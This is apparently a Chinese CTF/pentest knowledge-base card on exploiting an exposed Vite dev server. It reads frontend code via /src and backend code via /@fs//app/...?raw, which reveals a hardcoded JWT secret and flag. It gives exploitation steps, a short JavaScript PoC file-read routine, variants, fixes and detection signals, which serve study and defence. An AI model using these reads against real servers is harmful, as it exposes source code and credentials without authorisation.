---
id: web-nodejs-vite-dev-server-source-leak-fs
title: Vite 开发模式源码泄露：/src 直读 + /@fs 读服务器源码，硬编码 JWT secret 与 flag
type: scenario
domain: web
path: web/nodejs
technique: vite-dev-server-source-leak-fs
tags:
- nodejs
- vite
- react
- source-disclosure
- dev-server
- jwt
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V125
  verified_at: '2026-11-06T04:07:58+08:00'
  notes: 已对照原文核对：Vite dev 模式、/src 直读、/@fs//app/server/server.js?raw、JWT_SECRET=admin、buy-flag 中 flag 均与原文一致；未实际运行 PoC（目标站点已下线）。
url: /docs/web/nodejs/web-nodejs-vite-dev-server-source-leak-fs/
draft: false
kb_aliases:
- Vite dev server 源码泄露
- /@fs 读取
- /src/main.tsx
- 开发模式上线
- JWT secret admin
- Hit Me
---

## 一句话结论

生产站点误用 Vite 开发模式，`/@vite/client` 与 `/src/main.tsx` 直接可访问；`fetch('/src/*.tsx')` 拿到前端源码与 API 列表，Vite 报错暴露 `server/` 路径后，用 `/@fs//app/server/server.js?raw` 读取后端源码，得到硬编码 JWT secret `admin` 与 buy-flag 中的 flag。

## 原理

- **Vite dev server 按需返回源码**：开发模式下浏览器直接加载 `/src/main.tsx`，Vite 把 TS/JSX 转换后返回；源码里的 `import.meta.env.VITE_API_URL`、接口路径、组件逻辑都可读。生产环境应 build 成静态 bundle，不应把 dev server 暴露到公网。
- **`/@fs/` 访问项目外绝对路径**：Vite 的 `/@fs/` 前缀允许访问文件系统绝对路径（受 `server.fs.allow` 限制）；`?raw` 让模块返回文件原始文本而不是转换后的 JS。
- **错误信息泄露路径**：Vite overlay 报 `Failed to resolve import "better-sqlite3" from "server/database.js"`，说明 dev server 进程能访问 `server/` 目录，且项目根在 `/app`；于是可拼出 `/@fs//app/server/server.js?raw`。
- **硬编码秘密**：后端 `server.js` 中 `const JWT_SECRET = 'admin'` 可伪造任意用户 token；`/api/shop/buy-flag` 里 `const FLAG = 'sillyCTF{...}'` 直接暴露 flag。前端 `Shop.tsx` 的 `$10000` 余额检查只是 UI 逻辑，不是安全边界。

## 触发条件

- 页面脚本列表含 `@vite/client`、`/src/main.tsx` 等开发模式入口。
- Vite dev server 可被攻击者访问（`--host`/`server.host` 暴露）。
- `server.fs.allow` 未严格限制，或 `/@fs/` 可读项目外路径。
- 源码/环境变量中含 API 地址、JWT secret、flag 等敏感信息。

## 利用步骤

1. 控制台执行 `[...document.scripts].map(s => s.src || '(inline)')`，确认 Vite dev 模式。
2. `fetch('/src/main.tsx')`、`/src/App.tsx`、`/src/api/client.ts` 等，恢复前端源码与 API 列表。
3. 从 `client.ts` 读 `VITE_API_URL` 与接口（register/login/me/game/shop 等）。
4. 触发/观察 Vite overlay 错误，拿到 `server/` 相对路径与项目根。
5. 用 `import(/* @vite-ignore */ '/@fs//app/server/server.js?raw')` 或 `fetch` 读取后端源码；若路径不对，枚举 `/@fs/` 前缀与 `?raw`/`?inline`。
6. 在源码中搜索 `SECRET`、`FLAG`、`password`、`token`、`buy-flag` 等，直接取 flag 或伪造 JWT。

## PoC

```javascript
// 1) 确认 dev server
console.log([...document.scripts].map(s => s.src || '(inline)'));

// 2) 读前端源码
const src = await fetch('/src/api/client.ts').then(r => r.text());

// 3) 读后端源码（Vite @fs + raw）
async function rawFile(path) {
  for (const u of [`${path}?raw`, `/@fs//app${path}?raw`]) {
    try {
      const mod = await import(/* @vite-ignore */ u);
      console.log(mod.default);
      return mod.default;
    } catch (e) { console.warn('failed', u, e); }
  }
}
await rawFile('/server/server.js');
```

## 变体与关联

- **开发服务器变体**：webpack-dev-server、Next.js dev、Nuxt dev、Vite preview；都可能暴露源码/热更新端点。
- **读取变体**：`/@fs/` + 绝对路径、`?raw`/`?inline`、`/node_modules/.vite/` 缓存、sourcemap `.map`。
- **秘密变体**：`.env`、`VITE_*` 变量、JWT secret、数据库口令、第三方 API key、flag 常量。
- **关联卡片**：[[web-generic-websocket-vite-invoke-fetchmodule-file-read]]（Vite WS fetchModule 任意文件读取）、[[pentest-recon-sourcemap-leak-frontend-source-restore-api-discovery]]（sourcemap 还原源码）、[[web-nodejs-merge-proto-filter-mass-assignment-isadmin]]（同类的 Node.js 源码审计链）。
- **边界**：若生产环境已 build 且只暴露静态文件，`/src` 与 `/@fs` 不可用；若 `server.fs.allow` 严格限制且 dev server 不对外，本链不成立。

## 检测与防御

- **CTF/审计验证**：先确认 `/@vite/client` 可访问，再读 `/src` 源码，最后用 `/@fs` 读后端文件并核对内容。
- **修复**：生产环境只部署 build 产物，禁用/不暴露 Vite dev server；`server.fs.allow` 限制到项目根；不要把 secret/flag 写进前端或后端源码，使用环境变量/密钥管理；JWT secret 使用高熵随机值。
- **检测信号**：公网出现 `/@vite/client`、`/src/*.tsx`、`/@fs/` 请求；Vite overlay 错误；源码中包含 `JWT_SECRET`、`FLAG` 等常量。
